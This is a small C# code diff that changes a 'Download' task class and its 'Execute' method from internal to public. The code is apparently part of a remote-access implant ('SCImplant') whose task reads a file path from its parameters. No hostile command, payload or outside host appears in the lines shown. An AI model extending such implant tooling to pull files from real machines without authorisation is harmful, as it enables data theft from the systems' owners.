@@ -9,9 +9,9 @@ using System.Threading;
 /// </summary>
 namespace SaltedCaramel.Tasks
 {
-    internal class Download
+    public class Download
     {
-        internal static void Execute(SCTaskObject task, SCImplant implant)
+        public static void Execute(SCTaskObject task, SCImplant implant)
         {
             string filepath = task.@params;
             try // Try block for file upload task
